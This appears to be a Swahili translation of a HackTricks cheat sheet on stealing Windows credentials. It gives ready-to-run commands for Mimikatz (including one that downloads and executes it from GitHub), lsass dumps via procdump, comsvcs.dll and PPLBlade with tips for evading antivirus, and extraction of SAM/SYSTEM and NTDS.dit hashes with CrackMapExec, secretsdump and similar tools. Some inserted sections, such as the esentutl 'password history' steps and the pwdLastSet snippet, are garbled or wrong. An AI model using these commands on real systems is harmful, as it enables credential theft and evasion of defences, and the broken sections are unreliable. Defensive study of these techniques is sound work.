# Kuiba Vitambulisho vya Windows

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Kuiga Vitambulisho vya Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Pata vitu vingine ambavyo Mimikatz inaweza kufanya** [**kwenye ukurasa huu**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Jifunze kuhusu ulinzi wa vibali kadhaa hapa.**](credentials-protections.md) **Ulinzi huu unaweza kuzuia Mimikatz kutoa baadhi ya vibali.**

## Vibali na Meterpreter

Tumia [**Programu-jalizi ya Vibali**](https://github.com/carlospolop/MSF-Credentials) **ambayo** nimeunda ili **kutafuta nywila na hashi** ndani ya mwathiriwa.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Kuvuka AV

### Procdump + Mimikatz

Kwa kuwa **Procdump kutoka** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**ni chombo halali cha Microsoft**, hakigunduliwi na Defender.\
Unaweza kutumia chombo hiki ku **dump mchakato wa lsass**, **kupakua dump** na **kuchimbua** **vitambulisho kwa kiwango cha ndani** kutoka kwenye dump.

{% code title="Dump lsass" %}
```bash
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```
{% code title="Chukua siri za kuingia kutoka kwenye kichujio" %}
```c
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
{% endcode %}

Hii mchakato inafanywa kiotomatiki na [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Maelezo**: Baadhi ya **AV** inaweza **kugundua** kama **hatari** matumizi ya **procdump.exe kudump lsass.exe**, hii ni kwa sababu wanagundua neno **"procdump.exe" na "lsass.exe"**. Hivyo ni **siri zaidi** ku **pita** kama **hoja** PID ya lsass.exe kwa procdump **badala ya** jina la lsass.exe.

### Kudump lsass na **comsvcs.dll**

DLL iitwayo **comsvcs.dll** iliyo katika `C:\Windows\System32` inawajibika kwa **kudump kumbukumbu ya mchakato** katika tukio la ajali. DLL hii ina **kazi** iitwayo **`MiniDumpW`**, iliyoundwa kuitwa kwa kutumia `rundll32.exe`.\
Ni haifai kutumia hoja mbili za kwanza, lakini ya tatu imegawanywa katika sehemu tatu. Kitambulisho cha mchakato kinachotakiwa kudump kinawakilisha sehemu ya kwanza, mahali pa faili ya dump inawakilisha ya pili, na sehemu ya tatu ni neno **full**. Hakuna chaguo mbadala zilizopo.\
Baada ya kuchambua sehemu hizi tatu, DLL inahusika katika kuunda faili ya dump na kuhamisha kumbukumbu ya mchakato uliopewa katika faili hii.\
Matumizi ya **comsvcs.dll** yanawezekana kwa kudump mchakato wa lsass, hivyo kuondoa haja ya kupakia na kutekeleza procdump. Njia hii imeelezewa kwa undani katika [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

Amri ifuatayo inatumika kwa utekelezaji:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Unaweza kusindika hii taratibu kiotomatiki kwa kutumia** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Kuchota lsass kwa kutumia Task Manager**

1. Bonyeza kulia kwenye Task Bar na bonyeza kwenye Task Manager
2. Bonyeza kwenye More details
3. Tafuta mchakato wa "Local Security Authority Process" kwenye kichupo cha Processes
4. Bonyeza kulia kwenye mchakato wa "Local Security Authority Process" na bonyeza "Create dump file".

### Kuchota lsass kwa kutumia procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) ni faili iliyosainiwa na Microsoft ambayo ni sehemu ya [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) suite.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Kudondosha lsass na PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) ni chombo cha Kudondosha Mchakato Uliolindwa kinachosaidia kuficha kumbukumbu ya kudondosha na kuhamisha kwenye vituo vya kazi vya mbali bila kuacha kwenye diski.

**Vipengele muhimu**:

1. Kupita kinga ya PPL
2. Kuficha faili za kumbukumbu ya kudondosha ili kuepuka mbinu za kugundua saini za Defender
3. Kupakia kumbukumbu ya kudondosha kwa njia za RAW na SMB bila kuacha kwenye diski (kudondosha bila faili)

{% code overflow="wrap" %}
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
{% endcode %}

## CrackMapExec

### Dumpisha hashi za SAM
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Pata Siri za LSA

**Description**: Siri za LSA ni habari muhimu za uwakilishi wa usalama katika mfumo wa Windows. Kwa kudump siri hizi, unaweza kupata nywila na habari nyingine muhimu za uwakilishi wa usalama.

**Technique**: Kuna njia kadhaa za kudump siri za LSA:

1. **LSA Secrets Dump**: Unaweza kutumia zana kama `lsadump` au `mimikatz` kudump siri za LSA kutoka kwa mfumo uliopo. Zana hizi zinaweza kuchambua na kutoa habari muhimu kama vile nywila za akaunti za mtumiaji na nywila za kuhifadhiwa kwa programu.

2. **Registry**: Siri za LSA zinahifadhiwa katika rejista ya Windows. Unaweza kuchunguza na kudump siri hizi kwa kuchambua sehemu maalum za rejista kama vile `HKEY_LOCAL_MACHINE\Security\Policy\Secrets`.

**Impact**: Kwa kudump siri za LSA, unaweza kupata ufikiaji usio halali kwa akaunti za mtumiaji na habari nyingine muhimu za uwakilishi wa usalama. Hii inaweza kusababisha uvunjaji wa usalama, upotezaji wa data, na uharibifu mwingine wa mfumo.

**Countermeasures**: Kuna hatua kadhaa za kuchukua ili kuzuia kudump siri za LSA:

- Tumia sera kali za usalama kwenye mfumo wako ili kuzuia ufikiaji usio halali kwa siri za LSA.
- Funga na sasisha programu zote zinazojulikana kama `lsadump` au `mimikatz` ili kuzuia matumizi yao mabaya.
- Fanya ukaguzi wa mara kwa mara wa mfumo wako ili kugundua na kurekebisha mapungufu yoyote ya usalama yanayoweza kusababisha kudump siri za LSA.

**References**:
- [https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dumping-lsass-credentials](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/dumping-lsass-credentials)
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Pata NTDS.dit kutoka kwa DC ya lengo

```bash
# On the attacker machine
impacket-secretsdump -just-dc-ntlm <target_DC_IP>
```

Hii itakusaidia kupata faili ya NTDS.dit kutoka kwa DC ya lengo.
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Pata historia ya nywila ya NTDS.dit kutoka kwa DC ya lengo

```plaintext
To dump the NTDS.dit password history from a target Domain Controller (DC), you can use the following steps:

1. Gain administrative access to the target DC.
2. Open a command prompt with administrative privileges.
3. Navigate to the directory where the NTDS.dit file is located. The default path is `C:\Windows\NTDS`.
4. Use the `ntdsutil` command to enter the NTDS utility.
5. Within the NTDS utility, use the `activate instance ntds` command to activate the NTDS instance.
6. Use the `ifm` command to create an Install From Media (IFM) snapshot of the NTDS database.
7. Specify a directory where the IFM snapshot will be stored.
8. Exit the NTDS utility by using the `quit` command.
9. Navigate to the directory where the IFM snapshot is stored.
10. Use the `esentutl` command to dump the password history from the NTDS.dit file. The command syntax is as follows:
    ```
    esentutl /r <NTDS.dit> /l <log files path> /s <system files path> /d <destination path> /p "<password>"
    ```
    - `<NTDS.dit>`: Path to the NTDS.dit file.
    - `<log files path>`: Path to the log files directory.
    - `<system files path>`: Path to the system files directory.
    - `<destination path>`: Path where the dumped password history will be saved.
    - `<password>`: Password for the NTDS database.
11. Once the password history is dumped, you can analyze it to extract the desired credentials.

Note: Dumping the NTDS.dit file and accessing password history may be subject to legal restrictions and should only be performed with proper authorization and for legitimate purposes.
```
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Onyesha sifa ya pwdLastSet kwa kila akaunti ya NTDS.dit

Ili kuonyesha sifa ya pwdLastSet kwa kila akaunti ya NTDS.dit, unaweza kutumia zana ya PowerShell ifuatayo:

```powershell
Get-ADUser -Filter * -Properties pwdLastSet | Select-Object Name, pwdLastSet
```

Zana hii itakupa orodha ya akaunti zote za NTDS.dit pamoja na sifa ya pwdLastSet kwa kila akaunti.
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Kuiba SAM & SYSTEM

Faili hizi zinapaswa kuwa **zimehifadhiwa** katika _C:\windows\system32\config\SAM_ na _C:\windows\system32\config\SYSTEM._ Lakini **hauwezi tu kuzikopi kwa njia ya kawaida** kwa sababu zimekingwa.

### Kutoka kwenye Usajili (Registry)

Njia rahisi ya kuiba faili hizo ni kupata nakala kutoka kwenye usajili (registry):
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Pakua** faili hizo kwenye kifaa chako cha Kali na **toanishe alama** kwa kutumia:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Kivuli ya Nakala

Unaweza kufanya nakala ya faili zilizolindwa kwa kutumia huduma hii. Unahitaji kuwa Msimamizi.

#### Kutumia vssadmin

Faili ya vssadmin inapatikana tu kwenye toleo la Windows Server.
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Lakini unaweza kufanya hivyo kutoka **Powershell**. Hii ni mfano wa **jinsi ya kunakili faili ya SAM** (diski ngumu inayotumiwa ni "C:" na imehifadhiwa kwenye C:\users\Public) lakini unaweza kutumia hii kunakili faili yoyote iliyolindwa:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
$voume.Delete();if($notrunning -eq 1){$service.Stop()}
```
Code kutoka kwenye kitabu: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

Mwishowe, unaweza pia kutumia [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) kuunda nakala ya SAM, SYSTEM na ntds.dit.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

Faili la **NTDS.dit** linajulikana kama moyo wa **Active Directory**, likiwa na data muhimu kuhusu vitu vya mtumiaji, vikundi, na uanachama wao. Hapo ndipo **hashi za nywila** za watumiaji wa kikoa zinahifadhiwa. Faili hili ni **database ya Extensible Storage Engine (ESE)** na lipo katika **_%SystemRoom%/NTDS/ntds.dit_**.

Ndani ya database hii, kuna meza tatu kuu zinazosimamiwa:

- **Meza ya Data**: Meza hii inahusika na kuhifadhi maelezo kuhusu vitu kama watumiaji na vikundi.
- **Meza ya Link**: Inasimamia uhusiano, kama vile uanachama wa vikundi.
- **Meza ya SD**: **Maelezo ya usalama** kwa kila kipengee yanahifadhiwa hapa, ikidhibiti usalama na udhibiti wa ufikiaji kwa vitu vilivyohifadhiwa.

Maelezo zaidi kuhusu hili: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows hutumia _Ntdsa.dll_ kuwasiliana na faili hiyo na hutumiwa na _lsass.exe_. Kwa hivyo, **sehemu** ya faili ya **NTDS.dit** inaweza kupatikana **ndani ya kumbukumbu ya `lsass`** (unaweza kupata data iliyotembelewa hivi karibuni labda kwa sababu ya kuboresha utendaji kwa kutumia **cache**).

#### Kufichua hashi ndani ya NTDS.dit

Hashi imefichwa mara 3:

1. Fichua Funguo wa Kufichua Nywila (**PEK**) kwa kutumia **BOOTKEY** na **RC4**.
2. Fichua **hashi** kwa kutumia **PEK** na **RC4**.
3. Fichua **hashi** kwa kutumia **DES**.

**PEK** ina **thamani ile ile** katika **kila kudhibiti kikoa**, lakini imefichwa ndani ya faili ya **NTDS.dit** kwa kutumia **BOOTKEY** ya **faili ya SYSTEM ya kudhibiti kikoa (inatofautiana kati ya kudhibiti kikoa)**. Ndio maana ili kupata vibali kutoka kwenye faili ya NTDS.dit **unahitaji faili za NTDS.dit na SYSTEM** (_C:\Windows\System32\config\SYSTEM_).

### Kunakili NTDS.dit kwa kutumia Ntdsutil

Inapatikana tangu Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Unaweza pia kutumia mbinu ya [**kivuli cha nakala ya diski**](./#stealing-sam-and-system) kuiga faili ya **ntds.dit**. Kumbuka kuwa pia utahitaji nakala ya faili ya **SYSTEM** (tena, [**ichote kutoka kwenye usajili au tumia mbinu ya kivuli cha nakala ya diski**](./#stealing-sam-and-system)).

### **Kuchambua hash kutoka NTDS.dit**

Baada ya kupata faili za **NTDS.dit** na **SYSTEM** unaweza kutumia zana kama _secretsdump.py_ ku **chambua hash**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Unaweza pia **kuzitoa kiotomatiki** kwa kutumia mtumiaji halali wa admin wa kikoa:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Kwa **faili kubwa za NTDS.dit**, inapendekezwa kuzitoa kwa kutumia [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Mwishowe, unaweza pia kutumia moduli ya **metasploit**: _post/windows/gather/credentials/domain\_hashdump_ au **mimikatz** `lsadump::lsa /inject`

### **Kuchimbua vitu vya kikoa kutoka NTDS.dit hadi kwenye database ya SQLite**

Vitu vya NTDS vinaweza kuchimbwa kwenye database ya SQLite na [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Sio tu siri zinazochimbwa lakini pia vitu vyote na sifa zao kwa ajili ya uchimbaji wa habari zaidi wakati faili ya NTDS.dit ya awali imepatikana.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM` hive ni hiari lakini inaruhusu kufichua siri (NT & LM hashes, nywila za wazi, kerberos au trust keys, NT & LM password histories). Pamoja na habari nyingine, data ifuatayo inachimbwa: akaunti za mtumiaji na mashine pamoja na hashes zao, alama za UAC, muda wa kuingia mwisho na mabadiliko ya nywila, maelezo ya akaunti, majina, UPN, SPN, vikundi na uanachama wa kurekursi, muundo wa vitengo vya shirika na uanachama, domain za kuaminika na aina za uaminifu, mwelekeo na sifa...

## Lazagne

Pakua faili ya binary kutoka [hapa](https://github.com/AlessandroZ/LaZagne/releases). Unaweza kutumia faili hii ya binary kuchimbua siri kutoka programu mbalimbali.
```
lazagne.exe all
```
## Zana nyingine za kuchukua siri kutoka kwa SAM na LSASS

### Windows credentials Editor (WCE)

Zana hii inaweza kutumika kuchukua siri kutoka kwa kumbukumbu. Pakua kutoka: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Chukua siri kutoka kwa faili ya SAM
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Chukua siri za kuingia kutoka kwenye faili ya SAM
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Pakua kutoka: [http://www.tarasco.org/security/pwdump\_7](http://www.tarasco.org/security/pwdump\_7) na tu **itekeleze** na nywila zitachimbuliwa.

## Ulinzi

[Jifunze kuhusu baadhi ya ulinzi wa vitambulisho hapa.](credentials-protections.md)

<details>

<summary><strong>Jifunze kuhusu kuhack AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako inatangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi wa PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
